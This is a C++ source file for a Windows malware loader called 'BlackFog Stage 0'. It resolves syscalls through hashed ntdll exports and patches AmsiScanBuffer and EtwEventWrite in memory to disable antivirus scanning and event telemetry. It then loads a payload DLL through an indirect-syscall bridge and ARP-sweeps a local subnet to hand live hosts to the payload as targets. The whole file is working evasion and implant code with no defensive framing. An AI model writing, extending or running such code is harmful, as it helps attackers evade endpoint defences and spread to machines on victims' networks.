#include <iostream>
#include <vector>
#include <thread>
#include "Core.h"

namespace {

// Populate UNICODE_STRING for use with LdrLoadDll (avoids repeating Length math).
void InitUnicodeDllName(UNICODE_STRING* us, wchar_t* name) {
    us->Buffer = name;
    us->Length = static_cast<USHORT>(wcslen(name) * sizeof(wchar_t));
    us->MaximumLength = us->Length + sizeof(wchar_t);
}
// Resolve LdrLoadDll from ntdll using the project’s hashed export resolver.
LdrLoadDll ResolveLdrLoadDll() {
    return reinterpret_cast<LdrLoadDll>(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_LDR_LOAD_DLL));
}

} 
// Stage-0 native loader: AMSI/ETW handling, indirect syscall bridge to managed payload,
// and optional neighbor discovery via iphlpapi (hashed exports only — no GetProcAddress).
class BlackFogStageZero {
    uintptr_t m_blackFogBase = 0;

public:
    // Locates ntdll, parses Nt* stubs for syscall numbers, and caches the indirect syscall gadget.
    bool Initialize() {
        std::wcout << L"[*] BlackFog Stage 0 initialization..." << std::endl;

        ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        if (!ntdllBase) return false;

        g_ssn_allocate = Fog::Core::ExtractSSN(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_NT_ALLOCATE));
        g_ssn_protect = Fog::Core::ExtractSSN(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_NT_PROTECT));
        g_ssn_write = Fog::Core::ExtractSSN(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_NT_WRITE));
        g_ssn_thread = Fog::Core::ExtractSSN(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_NT_THREAD));

        if (!g_ssn_allocate || !g_ssn_protect || !g_ssn_write || !g_ssn_thread) {
            std::wcout << L"[-] Failed to resolve Syscalls cleanly. Aborting." << std::endl;
            return false;
        }

        std::wcout << L"[+] Arsenal loaded dynamically." << std::endl;
        return true;
    }

    // Loads amsi.dll via LdrLoadDll and patches AmsiScanBuffer using indirect Nt* syscalls.
    void ExecuteBlinding() {
        if (!ntdllBase)
            ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        if (!ntdllBase) return;

        std::wcout << L"[*] Target: amsi.dll" << std::endl;

        LdrLoadDll pLdrLoadDll = ResolveLdrLoadDll();
        if (!pLdrLoadDll) {
            std::wcout << L"[-] Failed to find LdrLoadDll address." << std::endl;
            return;
        }

        wchar_t amsiName[] = L"amsi.dll";
        UNICODE_STRING usAmsi = {};
        InitUnicodeDllName(&usAmsi, amsiName);

        HANDLE hAmsi = NULL;
        NTSTATUS status = pLdrLoadDll(NULL, NULL, &usAmsi, &hAmsi);
        if (status != 0 || !hAmsi) {
            std::wcout << L"[-] Failed to load amsi.dll via LdrLoadDll." << std::endl;
            return;
        }

        std::wcout << L"[+] amsi.dll loaded at: " << hAmsi << std::endl;

        uintptr_t pAmsiScanBuffer = Fog::Core::GetExportAddress(reinterpret_cast<uintptr_t>(hAmsi),Fog::Core::HASH_AMSISCANBUFFER);
        if (!pAmsiScanBuffer) {
            std::wcout << L"[-] Failed to find AmsiScanBuffer." << std::endl;
            return;
        }

        // xor eax, eax; ret — force AMSI_RESULT_CLEAN
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        SIZE_T patchSize = sizeof(patch);
        ULONG oldProtect = 0;

        Syscall_NtProtectVirtualMemory((HANDLE)-1, reinterpret_cast<PVOID*>(&pAmsiScanBuffer), &patchSize,PAGE_READWRITE, &oldProtect);
        Syscall_NtWriteVirtualMemory((HANDLE)-1, reinterpret_cast<PVOID>(pAmsiScanBuffer), patch, patchSize, NULL);
        Syscall_NtProtectVirtualMemory((HANDLE)-1, reinterpret_cast<PVOID*>(&pAmsiScanBuffer), &patchSize,oldProtect, &oldProtect);

        std::wcout << L"[+] AMSI successfully blinded!" << std::endl;
    }

    // Patches ntdll!EtwEventWrite after payload load so the image-load path stays intact.
    void PatchEtwEventWrite() {
        if (!ntdllBase) ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        if (!ntdllBase) return;

        uintptr_t etwAddr = Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_ETW_EVENT_WRITE);
        if (!etwAddr) return;

        std::wcout << L"[+] EtwEventWrite found at: " << reinterpret_cast<PVOID>(etwAddr) << std::endl;

        // xor rax, rax; ret (x64)
        BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
        SIZE_T pSize = sizeof(patch);
        ULONG oldProtect = 0;
        SIZE_T written = 0;

        // NtProtectVirtualMemory may update the pointer; pass a writable copy.
        PVOID protectAddr = reinterpret_cast<PVOID>(etwAddr);
        Syscall_NtProtectVirtualMemory((HANDLE)-1, &protectAddr, &pSize, PAGE_READWRITE, &oldProtect);
        Syscall_NtWriteVirtualMemory((HANDLE)-1, reinterpret_cast<PVOID>(etwAddr), patch, sizeof(patch), &written);
        Syscall_NtProtectVirtualMemory((HANDLE)-1, &protectAddr, &pSize, oldProtect, &oldProtect);

        std::wcout << L"[+] ETW fix successfully applied!" << std::endl;
    }

    // Optional: wake subnet with SendARP (warms kernel ARP cache), then read neighbor table and notify BlackFog.
    void IptablesPatch() {
        if (!ntdllBase) ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        if (!ntdllBase) return;

        LdrLoadDll pLdrLoadDll = ResolveLdrLoadDll();
        if (!pLdrLoadDll) {
            std::wcout << L"[-] Failed to find LdrLoadDll address." << std::endl;
            return;
        }

        wchar_t iphlpapiName[] = L"iphlpapi.dll";
        UNICODE_STRING usIphlpapi = {};
        InitUnicodeDllName(&usIphlpapi, iphlpapiName);

        HANDLE hIphlpapi = NULL;
        NTSTATUS status = pLdrLoadDll(NULL, NULL, &usIphlpapi, &hIphlpapi);
        if (status != 0 || !hIphlpapi) {
            std::wcout << L"[-] Failed to load iphlpapi.dll via LdrLoadDll." << std::endl;
            return;
        }

        std::wcout << L"[+] iphlpapi.dll loaded at: " << hIphlpapi << std::endl;

        const uintptr_t mod = reinterpret_cast<uintptr_t>(hIphlpapi);
        uintptr_t sendArpAddr = Fog::Core::GetExportAddress(mod, Fog::Core::HASH_SENDARP);
        pSendARP sendArp = reinterpret_cast<pSendARP>(sendArpAddr);

        if (sendArp) {
            std::wcout << L"[*] Waking subnet via SendARP (async)..." << std::endl;

            // 192.168.251.x — packed like a little-endian ULONG (low byte = last octet).
            constexpr uint32_t kOctetBase = 0xC0u | (0xA8u << 8) | (0xFBu << 16);
            for (int i = 1; i <= 254; i++) {
                const uint32_t targetIp = kOctetBase | (static_cast<uint32_t>(i) << 24);
                std::thread([sendArp, targetIp]() {
                    ULONG mac[2] = {};
                    ULONG macLen = 6;
                    sendArp(static_cast<IPAddr>(targetIp), 0, mac, &macLen);
                }).detach();
            }

            std::wcout << L"[*] Waiting for ARP cache..." << std::endl;
            Sleep(1500);
            std::wcout << L"[+] ARP probes dispatched." << std::endl;
        }

        uintptr_t freeMibAddr = Fog::Core::GetExportAddress(mod, Fog::Core::HASH_FREEMIBTABLE);
        uintptr_t getIpNetTable2Addr = Fog::Core::GetExportAddress(mod, Fog::Core::HASH_GET_IP_NET_TABLE2);

        if (!freeMibAddr || !getIpNetTable2Addr) {
            std::wcout << L"[-] Failed to resolve iphlpapi exports." << std::endl;
            return;
        }

        auto freeMibTable = reinterpret_cast<pFreeMibTable>(freeMibAddr);
        auto getIpNetTable2 = reinterpret_cast<pGetIpNetTable2>(getIpNetTable2Addr);

        PMIB_IPNET_TABLE2 table = nullptr;
        DWORD netStatus = getIpNetTable2(AF_INET, &table);

        if (netStatus != NO_ERROR || !table) {
            std::wcout << L"[-] GetIpNetTable2 failed. Status: " << netStatus << std::endl;
            return;
        }

        std::wcout << L"[+] IP neighbor table at: " << static_cast<PVOID>(table) << std::endl;

        std::vector<uint32_t> targetIps;
        for (ULONG i = 0; i < table->NumEntries; i++) {
            if (table->Table[i].State == NlnsReachable || table->Table[i].State == NlnsProbe) {
                uint32_t rawIp = table->Table[i].Address.Ipv4.sin_addr.S_un.S_addr;
                targetIps.push_back(rawIp);
            }
        }

        std::wcout << L"[+] Found " << targetIps.size() << L" live targets in ARP cache." << std::endl;

        if (m_blackFogBase) {
            using pSetTargets = void (*)(void* ipArrayPtr, int count);
            uintptr_t setAddr = Fog::Core::GetExportAddress(m_blackFogBase, Fog::Core::HASH_SET_TARGETS);
            auto setTargets = reinterpret_cast<pSetTargets>(setAddr);

            if (setTargets && !targetIps.empty()) {
                std::wcout << L"[*] Calling SetTargets..." << std::endl;
                setTargets(targetIps.data(), static_cast<int>(targetIps.size()));
            } else {
                std::wcout << L"[-] SetTargets unresolved or ARP list is empty." << std::endl;
            }
        } else {
            std::wcout << L"[-] BlackFog not loaded (run InjectPayload first)." << std::endl;
        }

        freeMibTable(table);
    }

    // Loads BlackFog.dll via LdrLoadDll, resolves InitializeCore by hash, passes indirect syscall bridge pointer.
    void InjectPayload() {
        std::wcout << L"[*] Launching BlackFog C# Core..." << std::endl;

        if (!ntdllBase) ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        if (!ntdllBase) return;

        LdrLoadDll pLdrLoadDll = ResolveLdrLoadDll();
        if (!pLdrLoadDll) {
            std::wcout << L"[-] Failed to find LdrLoadDll." << std::endl;
            return;
        }

        wchar_t dllName[] = L"BlackFog.dll";
        UNICODE_STRING us = {};
        InitUnicodeDllName(&us, dllName);

        HANDLE hCore = NULL;
        NTSTATUS st = pLdrLoadDll(NULL, NULL, &us, &hCore);
        if (st != 0 || !hCore) {
            std::wcout << L"[-] LdrLoadDll(BlackFog.dll) failed. NTSTATUS: 0x" << std::hex << static_cast<ULONG>(st)
                       << std::dec << std::endl;
            return;
        }

        m_blackFogBase = reinterpret_cast<uintptr_t>(hCore);

        using InitCoreFunc = void (*)(SYSCALL_BRIDGE*);
        uintptr_t initAddr = Fog::Core::GetExportAddress(m_blackFogBase, Fog::Core::HASH_INITIALIZE_CORE);
        if (!initAddr) {
            std::wcout << L"[-] Failed to resolve InitializeCore export." << std::endl;
            return;
        }

        auto initCore = reinterpret_cast<InitCoreFunc>(initAddr);
        SYSCALL_BRIDGE bridge = {};
        bridge.NtAllocateAddr = reinterpret_cast<uintptr_t>(Syscall_NtAllocateVirtualMemory);
        bridge.NtProtectAddr = reinterpret_cast<uintptr_t>(Syscall_NtProtectVirtualMemory);
        bridge.NtWriteAddr = reinterpret_cast<uintptr_t>(Syscall_NtWriteVirtualMemory);
        bridge.NtThreadAddr = reinterpret_cast<uintptr_t>(Syscall_NtCreateThreadEx);

        initCore(&bridge);
    }
};

int main() {
    BlackFogStageZero loader;

    if (loader.Initialize()) {
        loader.ExecuteBlinding();    // AMSI blind before managed load
        loader.InjectPayload();      // LdrLoadDll(BlackFog) + InitializeCore(&bridge)
        loader.PatchEtwEventWrite(); // ETW after DLL init (safer for loader chain)
        loader.IptablesPatch();      // Optional ARP cache + push targets to managed code
    }

    while (!GetAsyncKeyState(VK_DELETE)) {}
    return 0;
}
